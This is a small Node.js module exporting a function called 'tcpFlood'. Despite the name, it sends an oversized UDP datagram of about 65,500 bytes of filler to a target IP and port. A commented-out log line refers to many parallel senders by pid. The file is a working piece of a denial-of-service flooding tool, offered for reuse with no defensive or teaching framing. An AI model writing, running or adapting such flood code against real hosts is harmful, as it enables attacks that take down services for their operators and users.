let dgram = require('dgram');

function tcpFlood(ips, port, timeout, pid) {
    return new Promise((resolve, reject) => {
        let HOST = ips;
        let output = "";

        for (let i = 65500; i >= 0; i--) {
            output += "X";
        }

        let socket = dgram.createSocket('udp4');
        let message = Buffer.from(output);

        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
            if (err) throw err;
            // console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
            resolve([pid, bytes, HOST, port, socket.address().address, socket.address().port]);
        });

        socket.on('error', (err, rinfo) => {
            reject(err);
            // console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
        });
    });
}

module.exports = tcpFlood;